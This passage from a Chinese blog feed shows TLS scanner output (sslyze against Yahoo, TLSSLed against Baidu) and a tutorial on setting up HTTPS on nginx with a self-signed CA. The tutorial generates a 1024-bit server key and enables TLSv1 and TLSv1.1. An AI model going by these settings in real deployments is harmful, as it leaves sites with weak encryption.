u<span class="token string">'tw.rd.yahoo.com'</span>, u<span class="token string">'ddl.fp.yahoo.com'</span>, u<span class="token string">'ca.rogers.yahoo.com'</span>, u<span class="token string">'ca.my.yahoo.com'</span>, u<span class="token string">'add.my.yahoo.com'</span>, u<span class="token string">'*.global.vespa.oath.cloud'</span>, u<span class="token string">'hk.rd.yahoo.com'</span><span class="token punctuation">]</span>     Trust       Hostname Validation:               OK - Certificate matches www.yahoo.com       Android CA Store <span class="token punctuation">(</span>8.1.0_r9<span class="token punctuation">)</span>:       OK - Certificate is trusted       iOS CA Store <span class="token punctuation">(</span>11<span class="token punctuation">)</span>:                 OK - Certificate is trusted       Java CA Store <span class="token punctuation">(</span>jre-10.0.2<span class="token punctuation">)</span>:        OK - Certificate is trusted       macOS CA Store <span class="token punctuation">(</span>High Sierra<span class="token punctuation">)</span>:      OK - Certificate is trusted       Mozilla CA Store <span class="token punctuation">(</span>2018-04-12<span class="token punctuation">)</span>:     OK - Certificate is trusted       Windows CA Store <span class="token punctuation">(</span>2018-06-30<span class="token punctuation">)</span>:     OK - Certificate is trusted       Symantec 2018 Deprecation:         OK - Not a Symantec-issued certificate       Received Chain:                    *.www.yahoo.com --<span class="token operator">></span> DigiCert SHA2 High Assurance Server CA       Verified Chain:                    *.www.yahoo.com --<span class="token operator">></span> DigiCert SHA2 High Assurance Server CA --<span class="token operator">></span> DigiCert High Assurance EV Root CA       Received Chain Contains Anchor:    OK - Anchor certificate not sent       Received Chain Order:              OK - Order is valid       Verified Chain contains SHA1:      OK - No SHA1-signed certificate <span class="token keyword">in</span> the verified certificate chain     Extensions       OCSP Must-Staple:                  NOT SUPPORTED - Extension not found       Certificate Transparency:          WARNING - Only 2 SCTs included but Google recommends 3 or <span class="token function">more</span>     OCSP Stapling       OCSP Response Status:              successful       Validation w/ Mozilla Store:       OK - Response is trusted       Responder Id:                      5168FF90AF0207753CCCD9656462A212B859723B       Cert Status:                       good       Cert Serial Number:                06D754AE96D28371A4DEF60AC211B3E1       This Update:                       Aug 19 15:03:00 2020 GMT       Next Update:                       Aug 26 14:18:00 2020 GMT * Resumption Support:      With Session IDs:                  NOT SUPPORTED <span class="token punctuation">(</span>0 successful, 5 failed, 0 errors, 5 total attempts<span class="token punctuation">)</span>.      With TLS Tickets:                  OK - Supported * TLSV1_1 Cipher Suites:       Forward Secrecy                    OK - Supported       RC4                                OK - Not Supported     Preferred:        TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA              ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                      Accepted:        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA              ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_256_CBC_SHA                      -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA              ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_128_CBC_SHA                      -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                  * TLSV1_3 Cipher Suites:      Server rejected all cipher suites. * OpenSSL Heartbleed:                                          OK - Not vulnerable to Heartbleed * Downgrade Attacks:       TLS_FALLBACK_SCSV:                 OK - Supported * ROBOT Attack:                                          OK - Not vulnerable * TLSV1_2 Cipher Suites:       Forward Secrecy                    OK - Supported       RC4                                OK - Not Supported     Preferred:        TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256           ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                      Accepted:        RSA_WITH_AES_256_CCM_8                            -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256       -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384           ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         RSA_WITH_AES_256_CCM                              -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_256_CBC_SHA256                   -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384             ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         ECDHE_ECDSA_WITH_AES_256_CCM                      -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384           ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA              ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384             ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256     -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         ECDHE_ECDSA_WITH_AES_256_CCM_8                    -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_256_CBC_SHA                      -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_256_GCM_SHA384                   -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA              ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         RSA_WITH_AES_128_CCM_8                            -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         ECDHE_ECDSA_WITH_AES_128_CCM                      -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         RSA_WITH_AES_128_CCM                              -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         ECDHE_ECDSA_WITH_AES_128_CCM_8                    -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256             ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_128_CBC_SHA                      -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_128_CBC_SHA256                   -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256           ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_128_GCM_SHA256                   -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256             ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256           ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                  SCAN COMPLETED IN 7.29 S<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-TLSSLed"><a href="#6-TLSSLed" class="headerlink" title="6 TLSSLed"></a>6 TLSSLed</h2><p>该工具是基于sslscan的脚本工具，使用非常简单。用户可以一次性执行所有检测任务，并且会生成详细的日志文件。它可以检测支持的协议类型、空密码和弱密码以及强密码等功能。</p><pre><code>[root@localhost ~]# yum install tlssled[root@localhost ~]# tlssled [ip/domain] 443</code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localname ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># tlssled www.baidu.com 443</span>------------------------------------------------------ TLSSLed - <span class="token punctuation">(</span>1.3<span class="token punctuation">)</span> based on sslscan and openssl                 by Raul Siles <span class="token punctuation">(</span>www.taddong.com<span class="token punctuation">)</span>------------------------------------------------------    openssl version: OpenSSL 1.1.1g  21 Apr 2020    sslscan version 1.10.2 ------------------------------------------------------    Date: 20200821-110138------------------------------------------------------<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Analyzing SSL/TLS on www.baidu.com:443 <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Output directory: TLSSLed_1.3_www.baidu.com_443_20200821-110138 <span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking <span class="token keyword">if</span> the target <span class="token function">service</span> speaks SSL/TLS<span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> The target <span class="token function">service</span> www.baidu.com:443 seems to speak SSL/TLS<span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Using SSL/TLS protocol version:         <span class="token punctuation">(</span>empty means I'm using the default openssl protocol version<span class="token punctuation">(</span>s<span class="token punctuation">))</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running sslscan on www.baidu.com:443 <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> SSLv2 <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> the NULL cipher <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> weak ciphers <span class="token punctuation">(</span>based on key length - 40 or 56 bits<span class="token punctuation">)</span> <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> strong ciphers <span class="token punctuation">(</span>based on AES<span class="token punctuation">)</span> <span class="token punctuation">..</span>.    Accepted  TLSv1  256 bits  ECDHE-RSA-AES256-SHA    Accepted  TLSv1  256 bits  AES256-SHA    Accepted  TLSv1  128 bits  ECDHE-RSA-AES128-SHA    Accepted  TLSv1  128 bits  AES128-SHA    Accepted  TLS11  256 bits  ECDHE-RSA-AES256-SHA    Accepted  TLS11  256 bits  AES256-SHA    Accepted  TLS11  128 bits  ECDHE-RSA-AES128-SHA    Accepted  TLS11  128 bits  AES128-SHA    Accepted  TLS12  256 bits  ECDHE-RSA-AES256-SHA    Accepted  TLS12  256 bits  AES256-SHA    Accepted  TLS12  128 bits  ECDHE-RSA-AES128-GCM-SHA256    Accepted  TLS12  128 bits  ECDHE-RSA-AES128-SHA    Accepted  TLS12  128 bits  AES128-SHA    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> MD5 signed certificate <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> the certificate public key length <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> the certificate subject <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> the certificate CA issuer <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> the certificate validity period <span class="token punctuation">..</span>.    Today: Fri Aug 21 03:02:05 UTC 2020    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Checking preferred server ciphers <span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> SSL/TLS renegotiation MitM vuln. <span class="token punctuation">(</span>CVE-2009-3555<span class="token punctuation">)</span> <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> secure renegotiation support <span class="token punctuation">(</span>RFC 5746<span class="token punctuation">)</span> <span class="token punctuation">..</span>.    Secure Renegotiation IS supported<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> SSL/TLS renegotiation DoS vuln. <span class="token punctuation">(</span>CVE-2011-1473<span class="token punctuation">)</span> <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> client initiated <span class="token punctuation">(</span>CI<span class="token punctuation">)</span> SSL/TLS renegotiation <span class="token punctuation">(</span>secure<span class="token punctuation">)</span><span class="token punctuation">..</span>.    <span class="token punctuation">(</span>CI<span class="token punctuation">)</span> SSL/TLS renegotiation IS NOT enabled <span class="token punctuation">(</span>no renegotiation<span class="token punctuation">)</span>    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> client initiated <span class="token punctuation">(</span>CI<span class="token punctuation">)</span> SSL/TLS renegotiation <span class="token punctuation">(</span>insecure<span class="token punctuation">)</span><span class="token punctuation">..</span>.    <span class="token punctuation">(</span>CI<span class="token punctuation">)</span> SSL/TLS renegotiation IS NOT enabled <span class="token punctuation">(</span>no renegotiation<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> client authentication using digital certificates <span class="token punctuation">..</span>.    SSL/TLS client certificate authentication IS NOT required<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> TLS v1.1 and v1.2 <span class="token punctuation">(</span>CVE-2011-3389 vuln. aka BEAST<span class="token punctuation">)</span> <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> SSLv3 and TLSv1 support <span class="token punctuation">..</span>.    Accepted  SSLv3  112 bits  RC4-SHA    Accepted  TLSv1  256 bits  ECDHE-RSA-AES256-SHA    Accepted  TLSv1  256 bits  AES256-SHA    Accepted  TLSv1  128 bits  ECDHE-RSA-AES128-SHA    Accepted  TLSv1  128 bits  AES128-SHA    Accepted  TLSv1  112 bits  ECDHE-RSA-RC4-SHA    Accepted  TLSv1  112 bits  RC4-SHA    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> RC4 <span class="token keyword">in</span> the prefered cipher<span class="token punctuation">(</span>s<span class="token punctuation">)</span> list <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> TLS v1.1 support <span class="token punctuation">..</span>.    TLS v1.1 IS supported    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> TLS v1.2 support <span class="token punctuation">..</span>.    TLS v1.2 IS supported<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> HTTPS <span class="token punctuation">(</span>SSL/TLS<span class="token punctuation">)</span> security headers using HTTP/1.0 <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> HTTP Strict-Transport-Security <span class="token punctuation">(</span>HSTS<span class="token punctuation">)</span> header <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> cookies with the secure flag <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> cookies without the secure flag <span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> HTTPS <span class="token punctuation">(</span>SSL/TLS<span class="token punctuation">)</span> security headers using HTTP/1.1 <span class="token operator">&amp;</span> Host <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> HTTP Strict-Transport-Security <span class="token punctuation">(</span>HSTS<span class="token punctuation">)</span> header <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> cookies with the secure flag <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> cookies without the secure flag <span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> New files created:    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Output directory: TLSSLed_1.3_www.baidu.com_443_20200821-110138 <span class="token punctuation">..</span>.openssl_HEAD_1.0_www.baidu.com_443_20200821-110138.err    openssl_HEAD_www.baidu.com_443_20200821-110138.log        openssl_RENEG_www.baidu.com_443_20200821-110138.erropenssl_HEAD_1.0_www.baidu.com_443_20200821-110138.log    openssl_RENEG_LEGACY_www.baidu.com_443_20200821-110138.err  openssl_RENEG_www.baidu.com_443_20200821-110138.logopenssl_HEAD_www.baidu.com_443_20200821-110138.err    openssl_RENEG_LEGACY_www.baidu.com_443_20200821-110138.log  sslscan_www.baidu.com_443_20200821-110138.log<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-openssl"><a href="#7-openssl" class="headerlink" title="7 openssl"></a>7 openssl</h2><pre><code> openssl s_client -connect www.baidu.com:443　　【s_client:作为一个客户端 -connect：连接 +服务器域名:端口】 </code></pre><p><img src="/2020/08/26/htps-tools/1598432415793.png" alt="1598432415793"></p><p><img src="/2020/08/26/htps-tools/1596439698251.png" alt="1596439698251"></p><h2 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h2><p> <a href="https://blog.csdn.net/qq_42696904/article/details/85267927?utm_medium=distribute.pc_relevant.none-task-blog-baidulandingword-1&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/qq_42696904/article/details/85267927?utm_medium=distribute.pc_relevant.none-task-blog-baidulandingword-1&amp;spm=1001.2101.3001.4242</a> </p><p> <a href="https://github.com/nabla-c0d3/sslyze">https://github.com/nabla-c0d3/sslyze</a> </p><p> <a href="https://nabla-c0d3.github.io/sslyze/documentation/">https://nabla-c0d3.github.io/sslyze/documentation/</a> </p><p> <a href="https://www.freebuf.com/sectool/99151.html">https://www.freebuf.com/sectool/99151.html</a> </p><p> <a href="https://www.infinisign.com/faq/tls-ssl-security-testing">https://www.infinisign.com/faq/tls-ssl-security-testing</a> </p><p> <a href="https://testssl.sh/">https://testssl.sh/</a> </p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/TLS/">TLS</category>
      
      
      <comments>https://m01ly.github.io/2020/08/26/htps-tools/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>搭建https网站</title>
      <link>https://m01ly.github.io/2020/08/26/htps-build/</link>
      <guid>https://m01ly.github.io/2020/08/26/htps-build/</guid>
      <pubDate>Wed, 26 Aug 2020 08:29:43 GMT</pubDate>
      
      <description>&lt;p&gt;环境：centos 7&lt;/p&gt;
&lt;p&gt;nginx 版本：1.19.1&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>环境：centos 7</p><p>nginx 版本：1.19.1</p><a id="more"></a><h2 id="1-安装nginx"><a href="#1-安装nginx" class="headerlink" title="1 安装nginx"></a>1 安装nginx</h2><p>按照 <a href="https://www.runoob.com/linux/nginx-install-setup.html">https://www.runoob.com/linux/nginx-install-setup.html</a> 教程安装即可，记得安装最新版。</p><pre><code>wget http://nginx.org/download/nginx-1.19.1.tar.gz</code></pre><p>nginx安装目录配置 nginx.conf 如下：/usr/local/webserver/nginx/conf</p><h2 id="2-自签名证书"><a href="#2-自签名证书" class="headerlink" title="2 自签名证书"></a>2 自签名证书</h2><h3 id="2-1-CA根证书的生成步骤"><a href="#2-1-CA根证书的生成步骤" class="headerlink" title="2.1 CA根证书的生成步骤"></a>2.1 CA根证书的生成步骤</h3><p>新建一个文件夹ssl</p><pre><code>mkdir sslcd ssl</code></pre><h4 id="2-1-1-生成私钥"><a href="#2-1-1-生成私钥" class="headerlink" title="2.1.1 生成私钥"></a>2.1.1 <strong>生成私钥</strong></h4><p>生成CA私钥（.key）–&gt;生成CA证书请求（.csr）–&gt;自签名得到根证书（.crt）（CA给自已颁发的证书）。</p><pre class="line-numbers language-csharp"><code class="language-csharp"><span class="token preprocessor property"># Generate CA private key </span>openssl genrsa <span class="token operator">-</span><span class="token keyword">out</span> ca<span class="token punctuation">.</span>key <span class="token number">2048</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/08/26/htps-build/1597046435726.png" alt="1597046435726"></p><h4 id="2-1-2-生成证书请求文件"><a href="#2-1-2-生成证书请求文件" class="headerlink" title="2.1.2   生成证书请求文件"></a>2.1.2   <strong>生成证书请求文件</strong></h4><p> 这个过程会要求输入很多信息如国家、城市、组织信息等，其中 <code>Common Name (eg, your name or your server&#39;s hostname)</code> 是 <strong>必填项</strong> ，可以是域名或者 IP，其他都可以回车跳过，但是这样的话在签名证书时候会报错，下一章详述，不过自签名证书不影响。 </p><pre><code># Generate CSR openssl req -new -key ca.key -out ca.csr</code></pre><p><img src="/2020/08/26/htps-build/1597046507003.png" alt="1597046507003"></p><h4 id="2-1-3-生成自签名证书"><a href="#2-1-3-生成自签名证书" class="headerlink" title="2.1.3    生成自签名证书"></a>2.1.3    <strong>生成自签名证书</strong></h4><pre><code># Generate Self Signed certificate（CA 根证书）openssl x509 -req -days 365 -in ca.csr -signkey ca.key -out ca.crt</code></pre><p><img src="/2020/08/26/htps-build/1597046586371.png" alt="1597046586371"></p><h3 id="2-2-用户证书的生成步骤"><a href="#2-2-用户证书的生成步骤" class="headerlink" title="2.2 用户证书的生成步骤"></a>2.2 用户证书的生成步骤</h3><h4 id="2-2-1-生成私钥"><a href="#2-2-1-生成私钥" class="headerlink" title="2.2.1. 生成私钥"></a><strong>2.2.1. 生成私钥</strong></h4><p>生成私钥（.key）–&gt;生成证书请求（.csr）–&gt;用CA根证书签名得到证书（.crt）</p><p>服务器端用户证书：</p><pre class="line-numbers language-html"><code class="language-html"># private key$openssl genrsa -des3 -out server.key 1024 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/08/26/htps-build/1597046728463.png" alt="1597046728463"></p><h4 id="2-2-2-生成证书请求"><a href="#2-2-2-生成证书请求" class="headerlink" title="2.2.2 生成证书请求"></a>2.2.2 生成证书请求</h4><pre><code># generate csr$openssl req -new -key server.key -out server.csr</code></pre><p><img src="/2020/08/26/htps-build/1597046781761.png" alt="1597046781761"></p><h4 id="2-2-3-生成证书（根证书对用户的证书请求签名，最终生成用户证书）"><a href="#2-2-3-生成证书（根证书对用户的证书请求签名，最终生成用户证书）" class="headerlink" title="2.2.3  生成证书（根证书对用户的证书请求签名，最终生成用户证书）"></a>2.2.3  <strong>生成证书（根证书对用户的证书请求签名，最终生成用户证书）</strong></h4><p> 使用 <code>x509</code> 工具生成证书，因为它默认不使用 <code>openssl.cnf</code> </p><pre><code># generate certificate$openssl x509 -req -in server.csr -CA ca.crt \ -CAkey ca.key -out server.crt -CAcreateserial</code></pre><p><img src="/2020/08/26/htps-build/1597046922337.png" alt="1597046922337"></p><h4 id="2-2-4-验证证书有效性"><a href="#2-2-4-验证证书有效性" class="headerlink" title="2.2.4  验证证书有效性"></a>2.2.4  验证证书有效性</h4><pre><code>openssl verify -CAfile ca.crt server.crt</code></pre><p><img src="/2020/08/26/htps-build/1597047002938.png" alt="1597047002938"></p><h4 id="2-2-5-导出证书"><a href="#2-2-5-导出证书" class="headerlink" title="2.2.5 导出证书"></a>2.2.5 导出证书</h4><pre><code>cat server.crt server.key &gt; server.pem</code></pre><p><img src="/2020/08/26/htps-build/1597047735585.png" alt="1597047735585"></p><h2 id="3-配置nginx"><a href="#3-配置nginx" class="headerlink" title="3 配置nginx"></a>3 配置nginx</h2><p>将openssl生成的证书文件复制到nginx的目录下：</p><pre><code>[root@localname ~]#  cp -r ssl  /usr/local/webserver/nginx/conf/ssl</code></pre><h4 id="3-1-1-配置nginx-conf文件"><a href="#3-1-1-配置nginx-conf文件" class="headerlink" title="3.1.1 配置nginx.conf文件"></a>3.1.1 配置nginx.conf文件</h4><p>配置/usr/local/webserver/nginx/conf目录下的nginx.conf文件</p><pre><code>vim  /usr/local/webserver/nginx/conf/nginx.conf</code></pre><p>修改文件如下：</p><p><img src="/2020/08/26/htps-build/1597047296881.png" alt="1597047296881"></p><pre><code>server  &#123;    listen 443;#监听端口    server_name 192.168.10.136;#域名    index index.html index.htm index.php;    root /usr/local/webserver/nginx/html;#站点目录   #注意这些路径是相对于/etc/nginx/nginx.conf文件位置    ssl on;    ssl_certificate ssl/server.crt;    ssl_certificate_key ssl/server.key;    ssl_session_timeout 5m;    ssl_protocols TLSv1 TLSv1.1 TLSv1.2; #按照这个协议配置    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;#按照这个套件配置    ssl_prefer_server_ciphers on;    location ~ .*\.(php|php5)?$    &#123;      #fastcgi_pass unix:/tmp/php-cgi.sock;      fastcgi_pass 127.0.0.1:9000;      fastcgi_index index.php;      include fastcgi.conf;    &#125;    location ~ .*\.(gif|jpg|jpeg|png|bmp|swf|ico)$    &#123;      expires 30d;  # access_log off;    &#125;    location ~ .*\.(js|css)?$    &#123;      expires 15d;   # access_log off;    &#125;    access_log off;  &#125;</code></pre><h4 id="3-1-2-测试-停止-重启nginx服务"><a href="#3-1-2-测试-停止-重启nginx服务" class="headerlink" title="3.1.2  测试 /停止/重启nginx服务"></a>3.1.2  测试 /停止/重启nginx服务</h4><p>编译/usr/local/webserver/nginx/sbin/nginx  -t</p><p><img src="/2020/08/26/htps-build/1597044719436.png" alt="1597044719436"></p><p>重启  nginx：/usr/local/webserver/nginx/sbin/nginx  -s stop</p><p>启动：/usr/local/webserver/nginx/sbin/nginx</p><p>浏览器输入（本机ip地址）：<a href="https://192.168.10.136/">https://192.168.10.136/</a></p><p><img src="/2020/08/26/htps-build/1597044598226.png" alt="1597044598226"></p><p><img src="/2020/08/26/htps-build/1597044868039.png" alt="1597044868039"></p><p>这时候发现浏览器提示不安全的链接,这个时候将根证书ca.crt导入浏览器,重启,发现提示消失了.</p><h2 id="4-nginx日常操作命令"><a href="#4-nginx日常操作命令" class="headerlink" title="4 nginx日常操作命令"></a>4 nginx日常操作命令</h2><p>nginx -t 测试配置文件<br>nginx -s reload 修改配置后重载生效<br>nginx -s reopen 重新打开日志文件<br>nginx -s stop 快速停止<br>nginx -s quit</p><p>查看nginx进程<br>ps -ef | grep nginx</p><h2 id="REF"><a href="#REF" 